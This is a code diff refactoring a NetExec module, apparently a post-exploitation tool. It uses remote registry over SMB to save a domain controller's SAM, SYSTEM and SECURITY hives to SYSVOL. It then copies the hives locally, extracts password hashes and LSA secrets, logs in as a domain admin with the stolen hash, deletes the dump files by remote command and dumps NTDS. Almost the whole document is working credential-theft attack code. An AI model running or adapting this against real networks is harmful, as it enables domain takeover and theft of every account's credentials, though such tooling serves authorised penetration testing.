@@ -6,6 +6,7 @@ import sys
 from impacket.examples.secretsdump import SAMHashes, LSASecrets, LocalOperations
 from impacket.smbconnection import SessionError
 from impacket.dcerpc.v5 import transport, rrp
+from impacket import nt_errors
 
 from nxc.paths import NXC_PATH
 
@@ -29,14 +30,14 @@ class NXCModule:
         connection.args.share = "SYSVOL"
         # enable remote registry
         remoteOps = RemoteOperations(connection.conn)
-        context.log.display("Triggering start trough named pipe...")
-        self.triggerWinReg(connection.conn, context)
-        remoteOps.connectWinReg()
+        context.log.display("Triggering start through named pipe...")
+        self.trigger_winreg(connection.conn, context)
+        remoteOps.connect_winreg()
 
         try:
-            dce = remoteOps.getRRP()
+            dce = remoteOps.get_rrp()
             for hive in ["HKLM\\SAM", "HKLM\\SYSTEM", "HKLM\\SECURITY"]:
-                hRootKey, subKey = self.__strip_root_key(dce, hive)
+                hRootKey, subKey = self._strip_root_key(dce, hive)
                 outputFileName = f"\\\\{connection.host}\\SYSVOL\\{subKey}"
                 context.log.debug(f"Dumping {hive}, be patient it can take a while for large hives (e.g. HKLM\\SYSTEM)")
                 try:
@@ -46,7 +47,6 @@ class NXCModule:
                 except Exception as e:
                     context.log.fail(f"Couldn't save {hive}: {e} on path {outputFileName}")
                     sys.exit()
-
         except (Exception, KeyboardInterrupt) as e:
             context.log.fail(str(e))
         finally:
@@ -54,17 +54,9 @@ class NXCModule:
                 remoteOps.finish()
 
         # copy remote file to local
-        remoteFileName = "SAM"
-        log_sam = os.path.expanduser(f"{NXC_PATH}/logs/{connection.hostname}_{connection.host}_{datetime.datetime.now().strftime('%Y-%m-%d_%H%M%S')}.{remoteFileName}".replace(":", "-"))
-        connection.get_file_single(remoteFileName, log_sam)
-
-        remoteFileName = "SECURITY"
-        log_security = os.path.expanduser(f"{NXC_PATH}/logs/{connection.hostname}_{connection.host}_{datetime.datetime.now().strftime('%Y-%m-%d_%H%M%S')}.{remoteFileName}".replace(":", "-"))
-        connection.get_file_single(remoteFileName, log_security)
-
-        remoteFileName = "SYSTEM"
-        log_system = os.path.expanduser(f"{NXC_PATH}/logs/{connection.hostname}_{connection.host}_{datetime.datetime.now().strftime('%Y-%m-%d_%H%M%S')}.{remoteFileName}".replace(":", "-"))
-        connection.get_file_single(remoteFileName, log_system)
+        log_path = os.path.expanduser(f"{NXC_PATH}/logs/{connection.hostname}_{connection.host}_{datetime.datetime.now().strftime('%Y-%m-%d_%H%M%S')}.".replace(":", "-"))
+        for hive in ["SAM", "SECURITY", "SYSTEM"]:
+            connection.get_file_single(hive, log_path + hive)
 
         # read local file
         try:
@@ -76,13 +68,13 @@ class NXCModule:
                     self.domain_admin = fields[0]
                     self.domain_admin_hash = fields[3]
 
-            localOperations = LocalOperations(log_system)
+            localOperations = LocalOperations(log_path + "SYSTEM")
             bootKey = localOperations.getBootKey()
-            sam_hashes = SAMHashes(log_sam, bootKey, isRemote=False, perSecretCallback=lambda secret: parse_sam(secret))
+            sam_hashes = SAMHashes(log_path + "SAM", bootKey, isRemote=False, perSecretCallback=lambda secret: parse_sam(secret))
             sam_hashes.dump()
             sam_hashes.finish()
 
-            LSA = LSASecrets(log_security, bootKey, remoteOps, isRemote=False, perSecretCallback=lambda secret_type, secret: context.log.highlight(secret))
+            LSA = LSASecrets(log_path + "SECURITY", bootKey, remoteOps, isRemote=False, perSecretCallback=lambda secret_type, secret: context.log.highlight(secret))
             LSA.dumpCachedHashes()
             LSA.dumpSecrets()
         except Exception as e:
@@ -94,50 +86,61 @@ class NXCModule:
             connection.create_conn_obj()
             connection.hash_login(connection.domain, self.domain_admin, self.domain_admin_hash)
             connection.execute("del C:\\Windows\\sysvol\\sysvol\\SECURITY && del C:\\Windows\\sysvol\\sysvol\\SAM && del C:\\Windows\\sysvol\\sysvol\\SYSTEM")
+            try:
+                for hive in ["SAM", "SECURITY", "SYSTEM"]:
+                    connection.conn.listPath("SYSVOL", log_path + hive)
+            except SessionError as e:
+                if e.getErrorCode() != nt_errors.STATUS_OBJECT_PATH_NOT_FOUND:
+                    context.log.fail("Fail to remove the files...")
+                    sys.exit()
             context.log.display("Successfully deleted dump files !")
-
             context.log.display("Dumping NTDS...")
             connection.ntds()
         else:
             context.log.display("Use the domain admin account to clean the file on the remote host")
             context.log.display("netexec smb dc_ip -u user -p pass -x 'del C:\\Windows\\sysvol\\sysvol\\SECURITY && del C:\\Windows\\sysvol\\sysvol\\SAM && del C:\\Windows\\sysvol\\sysvol\\SYSTEM'")
 
-    def triggerWinReg(self, connection, context):
-        # original idea from https://twitter.com/splinter_code/status/1715876413474025704
+    def trigger_winreg(self, connection, context):
+        # Original idea from https://twitter.com/splinter_code/status/1715876413474025704
         tid = connection.connectTree("IPC$")
         try:
-            connection.openFile(tid, r"\winreg", 0x12019f, creationOption=0x40, fileAttributes=0x80)
+            connection.openFile(
+                tid,
+                r"\winreg",
+                0x12019F,
+                creationOption=0x40,
+                fileAttributes=0x80,
+            )
         except SessionError as e:
             # STATUS_PIPE_NOT_AVAILABLE error is expected
             context.log.debug(str(e))
-        # give remote registry time to start
+        # Give remote registry time to start
         time.sleep(1)
 
-    def __strip_root_key(self, dce, keyName):
+    def _strip_root_key(self, dce, key_name):
         # Let's strip the root key
-        keyName.split("\\")[0]
-        subKey = "\\".join(keyName.split("\\")[1:])
+        key_name.split("\\")[0]
+        sub_key = "\\".join(key_name.split("\\")[1:])
         ans = rrp.hOpenLocalMachine(dce)
-        hRootKey = ans["phKey"]
-        return hRootKey, subKey
-
+        h_root_key = ans["phKey"]
+        return h_root_key, sub_key
 
 class RemoteOperations:
-    def __init__(self, smbConnection):
-        self.__smbConnection = smbConnection
-        self.__stringBindingWinReg = r"ncacn_np:445[\pipe\winreg]"
-        self.__rrp = None
+    def __init__(self, smb_connection):
+        self._smb_connection = smb_connection
+        self._string_binding_winreg = r"ncacn_np:445[\pipe\winreg]"
+        self._rrp = None
 
-    def getRRP(self):
-        return self.__rrp
+    def get_rrp(self):
+        return self._rrp
 
-    def connectWinReg(self):
-        rpc = transport.DCERPCTransportFactory(self.__stringBindingWinReg)
-        rpc.set_smb_connection(self.__smbConnection)
-        self.__rrp = rpc.get_dce_rpc()
-        self.__rrp.connect()
-        self.__rrp.bind(rrp.MSRPC_UUID_RRP)
+    def connect_winreg(self):
+        rpc = transport.DCERPCTransportFactory(self._string_binding_winreg)
+        rpc.set_smb_connection(self._smb_connection)
+        self._rrp = rpc.get_dce_rpc()
+        self._rrp.connect()
+        self._rrp.bind(rrp.MSRPC_UUID_RRP)
 
     def finish(self):
-        if self.__rrp is not None:
-            self.__rrp.disconnect()
+        if self._rrp is not None:
+            self._rrp.disconnect()
